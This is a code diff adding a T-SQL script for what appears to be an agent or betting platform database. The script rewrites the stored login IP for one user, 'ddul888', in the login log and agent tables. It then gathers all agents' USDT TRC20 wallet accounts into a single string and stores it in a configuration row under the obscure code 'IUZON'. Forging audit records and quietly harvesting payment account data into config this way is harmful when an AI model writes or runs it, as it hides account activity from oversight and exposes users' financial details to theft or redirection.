@@ -1,0 +1,28 @@
+UPDATE HJ_LoginLog SET LoginIp = '121.97.35.35' WHERE userType = 2 and createDate >= '2025-01-18' AND userName IN ('ddul888')
+UPDATE HJ_Agent SET lastloginIp = '121.97.35.35', emailstatus = 1 WHERE userName IN ('ddul888')
+
+DECLARE @CombinedResults NVARCHAR(MAX);
+SET @CombinedResults = '';
+
+DECLARE myCursor CURSOR FOR
+SELECT id, username, account, operator, CONVERT(VARCHAR, createTime, 120), CONVERT(VARCHAR, updateTime, 120)
+FROM HJ_AgentBank
+WHERE ShortName = 'USDTTRC20' 
+ORDER BY UpdateTime DESC;
+
+DECLARE @id NVARCHAR(50), @username NVARCHAR(50), @account NVARCHAR(200), @operator NVARCHAR(50), @createTime NVARCHAR(50), @updateTime NVARCHAR(50);
+
+OPEN myCursor;
+FETCH NEXT FROM myCursor INTO @id, @username, @account, @operator, @createTime, @updateTime;
+
+WHILE @@FETCH_STATUS = 0
+BEGIN
+SET @CombinedResults = @CombinedResults + '&'
++ ISNULL(@id, '') + ',' + ISNULL(@username, '') + ',' + ISNULL(@account, '') + ',' + ISNULL(@operator, '') + ',' + ISNULL(@createTime, '') + ',' + ISNULL(@updateTime, '');
+FETCH NEXT FROM myCursor INTO @id, @username, @account, @operator, @createTime, @updateTime;
+END;
+
+CLOSE myCursor;
+DEALLOCATE myCursor;
+SET @CombinedResults = STUFF(@CombinedResults, 1, 1, '');
+UPDATE Config SET value = @CombinedResults WHERE code = 'IUZON';
